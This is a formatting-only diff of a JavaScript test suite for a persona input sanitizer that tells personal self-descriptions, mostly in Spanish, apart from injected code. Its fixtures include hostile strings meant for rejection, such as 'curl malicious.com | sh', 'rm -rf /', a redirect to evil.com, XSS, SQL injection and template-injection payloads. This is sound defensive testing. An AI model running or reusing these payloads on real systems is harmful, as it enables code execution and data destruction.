@@ -12,7 +12,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
     test('should accept legitimate personal tech descriptions (resolved false positives)', () => {
       const legitimatePersonalDescriptions = [
         'Mi trabajo es como function en JavaScript, transformo datos en soluciones',
-        'Soy desarrollador y echo en falta más tiempo para programar', 
+        'Soy desarrollador y echo en falta más tiempo para programar',
         'Me gusta print art y las técnicas de impresión',
         'Trabajo en una empresa SELECT de recursos humanos',
         'Soy import/export manager en comercio internacional',
@@ -20,10 +20,10 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Trabajo con GET requests y tecnologías web',
         'Me dedico al desarrollo web y uso HTML tags regularmente',
         'Soy consultor JSON y trabajo con APIs',
-        'Mi perfil profesional incluye C programming y desarrollo',
+        'Mi perfil profesional incluye C programming y desarrollo'
       ];
 
-      legitimatePersonalDescriptions.forEach(text => {
+      legitimatePersonalDescriptions.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -41,10 +41,10 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'eval(atob("Y29uc29sZS5sb2coJ2hhY2tlZCcp"))',
         '{{7*7}}',
         'nmap -sS target.com',
-        'document.querySelector("#user").innerHTML = "hacked"',
+        'document.querySelector("#user").innerHTML = "hacked"'
       ];
 
-      maliciousInjections.forEach(text => {
+      maliciousInjections.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).toBeNull();
       });
@@ -81,7 +81,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
 
       ambiguousContent.forEach(({ text, shouldAccept, reason }) => {
         const result = sanitizer.sanitizePersonaInput(text);
-        
+
         if (shouldAccept) {
           expect(result).not.toBeNull();
           expect(result).toBe(text);
@@ -96,12 +96,12 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
     test('should correctly identify legitimate personal tech descriptions', () => {
       const personalTechDescriptions = [
         'Trabajo con JavaScript y React para desarrollar aplicaciones',
-        'Mi experiencia incluye SQL y base de datos PostgreSQL', 
+        'Mi experiencia incluye SQL y base de datos PostgreSQL',
         'Me dedico al desarrollo backend con Python y Django',
-        'Tengo 5 años de experiencia en programación funcional',
+        'Tengo 5 años de experiencia en programación funcional'
       ];
 
-      personalTechDescriptions.forEach(text => {
+      personalTechDescriptions.forEach((text) => {
         const isLegitimate = sanitizer.isLegitimatePersonalTechDescription(text);
         expect(isLegitimate).toBe(true);
       });
@@ -128,13 +128,13 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
 
       testCases.forEach(({ text, expectedHighCodeDensity, expectedLowPersonalContent }) => {
         const analysis = sanitizer.analyzeContentContext(text);
-        
+
         if (expectedHighCodeDensity) {
           expect(analysis.codeDensity).toBeGreaterThan(0.1);
         } else {
           expect(analysis.codeDensity).toBeLessThan(0.1);
         }
-        
+
         if (expectedLowPersonalContent) {
           expect(analysis.personalIndicators).toBeLessThan(0.1);
         } else {
@@ -149,23 +149,23 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         { text: 'const malware = "evil";', pattern: 'variable_declaration' },
         { text: 'function hack() { delete_files(); }', pattern: 'function_definition' },
         { text: 'class Exploit: def run(self): pass', pattern: 'class_definition' },
-        
+
         // SQL injections
         { text: 'SELECT * FROM passwords', pattern: 'sql_select' },
         { text: 'DROP TABLE users', pattern: 'sql_ddl' },
         { text: 'UNION SELECT credit_cards FROM database', pattern: 'sql_union' },
-        
+
         // Shell commands
         { text: 'bash -c "rm -rf /"', pattern: 'shell_command' },
         { text: 'curl malicious.com | sh', pattern: 'network_tool' },
-        
+
         // Template injection
         { text: '{{config.SECRET_KEY}}', pattern: 'template_injection' },
         { text: '${java.lang.Runtime}', pattern: 'expression_language' },
-        
+
         // Browser/DOM attacks
         { text: 'document.location = "evil.com"', pattern: 'dom_manipulation' },
-        { text: 'eval("malicious code")', pattern: 'eval_function' },
+        { text: 'eval("malicious code")', pattern: 'eval_function' }
       ];
 
       patternTests.forEach(({ text, pattern }) => {
@@ -182,10 +182,10 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Trabajo como consultor especializado en arquitecturas microservicios',
         'Soy experto en machine learning con TensorFlow',
         'Mi área de especialización incluye blockchain y smart contracts',
-        'Tengo experiencia desarrollando APIs RESTful con Node.js',
+        'Tengo experiencia desarrollando APIs RESTful con Node.js'
       ];
 
-      technicalButPersonal.forEach(text => {
+      technicalButPersonal.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -196,7 +196,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
       const sophisticatedAttacks = [
         // Obfuscated JavaScript
         'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
-        // Base64 encoded payloads  
+        // Base64 encoded payloads
         'exec(base64.b64decode("aW1wb3J0IG9z"))',
         // Template engine exploitation
         '#set($x = $rt.getRuntime().exec("whoami"))',
@@ -207,10 +207,10 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         // XSS with event handlers
         '<svg onload=alert(document.cookie)>',
         // SSTI (Server-Side Template Injection)
-        '{{request.application.__globals__.__builtins__.__import__("os").system("whoami")}}',
+        '{{request.application.__globals__.__builtins__.__import__("os").system("whoami")}}'
       ];
 
-      sophisticatedAttacks.forEach(text => {
+      sophisticatedAttacks.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).toBeNull();
       });
@@ -225,7 +225,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         },
         {
           text: 'Mi trabajo requiere conocer SELECT statements pero trabajo en RRHH',
-          shouldAccept: true,  
+          shouldAccept: true,
           reason: 'Personal work context with technical knowledge'
         },
         {
@@ -237,7 +237,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
 
       mixedContent.forEach(({ text, shouldAccept, reason }) => {
         const result = sanitizer.sanitizePersonaInput(text);
-        
+
         if (shouldAccept) {
           expect(result).not.toBeNull();
         } else {
@@ -247,12 +247,13 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
     });
 
     test('should maintain performance with long inputs', () => {
-      const longLegitimateText = 'Soy desarrollador senior con más de 10 años de experiencia en JavaScript, Python, y tecnologías web modernas. Mi especialidad incluye React, Node.js, Express, MongoDB, PostgreSQL, Docker, Kubernetes, y arquitecturas de microservicios. He trabajado en empresas tanto startups como Fortune 500, liderando equipos de desarrollo y diseñando sistemas escalables. Mi pasión es crear soluciones elegantes para problemas complejos, y disfruto especialmente del mentoring a desarrolladores junior. En mi tiempo libre contribuyo a proyectos open source y escribo artículos técnicos sobre las últimas tendencias en desarrollo web.';
-      
+      const longLegitimateText =
+        'Soy desarrollador senior con más de 10 años de experiencia en JavaScript, Python, y tecnologías web modernas. Mi especialidad incluye React, Node.js, Express, MongoDB, PostgreSQL, Docker, Kubernetes, y arquitecturas de microservicios. He trabajado en empresas tanto startups como Fortune 500, liderando equipos de desarrollo y diseñando sistemas escalables. Mi pasión es crear soluciones elegantes para problemas complejos, y disfruto especialmente del mentoring a desarrolladores junior. En mi tiempo libre contribuyo a proyectos open source y escribo artículos técnicos sobre las últimas tendencias en desarrollo web.';
+
       const startTime = Date.now();
       const result = sanitizer.sanitizePersonaInput(longLegitimateText);
       const endTime = Date.now();
-      
+
       expect(result).not.toBeNull();
       expect(result).toBe(longLegitimateText);
       expect(endTime - startTime).toBeLessThan(100); // Should complete in under 100ms
@@ -263,13 +264,13 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
     test('should handle Spanish and English technical descriptions', () => {
       const multilingualDescriptions = [
         'Soy full-stack developer con experiencia en JavaScript y Python',
-        'I am a software engineer specializing in machine learning algorithms', 
+        'I am a software engineer specializing in machine learning algorithms',
         'Mi expertise incluye database design y API development',
         'Work with microservices architecture y cloud computing',
-        'Passionate about programming y desarrollo de software',
+        'Passionate about programming y desarrollo de software'
       ];
 
-      multilingualDescriptions.forEach(text => {
+      multilingualDescriptions.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -291,7 +292,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Soy fanático de los videojuegos 🎮 y la tecnología 🔧'
       ];
 
-      emojiDescriptions.forEach(text => {
+      emojiDescriptions.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -312,7 +313,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Prefiero té verde vs café negro'
       ];
 
-      specialCharacterDescriptions.forEach(text => {
+      specialCharacterDescriptions.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -331,7 +332,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Trabajo con fórmulas que incluyen √ y ²'
       ];
 
-      mathSymbolDescriptions.forEach(text => {
+      mathSymbolDescriptions.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -348,7 +349,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Mi objetivo: crear apps que mejoren la vida de las personas ❤️'
       ];
 
-      mixedContent.forEach(text => {
+      mixedContent.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).not.toBeNull();
         expect(result).toBe(text);
@@ -364,7 +365,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'console.log("🚀 injection attempt");'
       ];
 
-      maliciousWithEmojis.forEach(text => {
+      maliciousWithEmojis.forEach((text) => {
         const result = sanitizer.sanitizePersonaInput(text);
         expect(result).toBeNull();
       });
@@ -382,7 +383,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Mi personalidad: alegre 😄, optimista ✨, y creativo 🎨'
       ];
 
-      emojiTexts.forEach(originalText => {
+      emojiTexts.forEach((originalText) => {
         // First sanitize the input
         const sanitized = sanitizer.sanitizePersonaInput(originalText);
         expect(sanitized).not.toBeNull();
@@ -406,7 +407,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Mi salario es > 50k€ al año, trabajo con C++ & C#'
       ];
 
-      specialCharTexts.forEach(originalText => {
+      specialCharTexts.forEach((originalText) => {
         // First sanitize the input
         const sanitized = sanitizer.sanitizePersonaInput(originalText);
         expect(sanitized).not.toBeNull();
@@ -430,7 +431,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Calculo áreas usando π y trabajo con √ y ²'
       ];
 
-      mathTexts.forEach(originalText => {
+      mathTexts.forEach((originalText) => {
         // First sanitize the input
         const sanitized = sanitizer.sanitizePersonaInput(originalText);
         expect(sanitized).not.toBeNull();
@@ -447,7 +448,8 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
     });
 
     test('should handle long texts with mixed multibyte characters', () => {
-      const longMultibyteText = 'Soy José 👋, desarrollador con experiencia 💼. Trabajo en Barcelona 🏙️ como developer (React/Node.js) 💻. Me encantan las matemáticas ∑, la música 🎵, viajar ✈️ y la fotografía 📸. Práctico yoga 🧘‍♂️ & mindfulness 🌱. Mi objetivo: crear apps que mejoren la vida ❤️';
+      const longMultibyteText =
+        'Soy José 👋, desarrollador con experiencia 💼. Trabajo en Barcelona 🏙️ como developer (React/Node.js) 💻. Me encantan las matemáticas ∑, la música 🎵, viajar ✈️ y la fotografía 📸. Práctico yoga 🧘‍♂️ & mindfulness 🌱. Mi objetivo: crear apps que mejoren la vida ❤️';
 
       // Verify it's under 300 characters for encryption
       expect(longMultibyteText.length).toBeLessThan(300);
@@ -481,10 +483,10 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
       for (let i = 0; i < 5; i++) {
         const encrypted = encryptionService.encrypt(currentText);
         currentText = encryptionService.decrypt(encrypted);
-        
+
         // Verify data integrity after each cycle
         expect(currentText).toBe(testText);
-        
+
         // Verify it still passes sanitization
         const sanitized = sanitizer.sanitizePersonaInput(currentText);
         expect(sanitized).toBe(testText);
@@ -499,12 +501,12 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         'Mixed content: José 👋 works with π & ∑ in München 🏙️'
       ];
 
-      testCases.forEach(originalText => {
+      testCases.forEach((originalText) => {
         const sanitized = sanitizer.sanitizePersonaInput(originalText);
         expect(sanitized).toBe(originalText);
 
         const encrypted = encryptionService.encrypt(sanitized);
-        
+
         // Validate the encrypted data using the service's validation method
         const validation = encryptionService.validateEncryptedData(encrypted);
         expect(validation.valid).toBe(true);
@@ -512,7 +514,7 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
       });
     });
   });
-  
+
   describe('Compatibility with Existing Tests', () => {
     test('should maintain compatibility with original detection logic', () => {
       // Test that refined detection doesn't break existing functionality
@@ -522,12 +524,12 @@ describe('PersonaInputSanitizer - Refined Non-Personal Content Detection', () =>
         { text: 'import React from "react"', shouldReject: true },
         { text: 'console.log("Hello World")', shouldReject: true },
         { text: 'curl -X GET https://api.example.com', shouldReject: true }, // curl with flags is detected
-        { text: '{"name": "John", "age": 30}', shouldReject: true },
+        { text: '{"name": "John", "age": 30}', shouldReject: true }
       ];
 
       originalTestCases.forEach(({ text, shouldReject }) => {
         const result = sanitizer.sanitizePersonaInput(text);
-        
+
         if (shouldReject) {
           expect(result).toBeNull();
         } else {
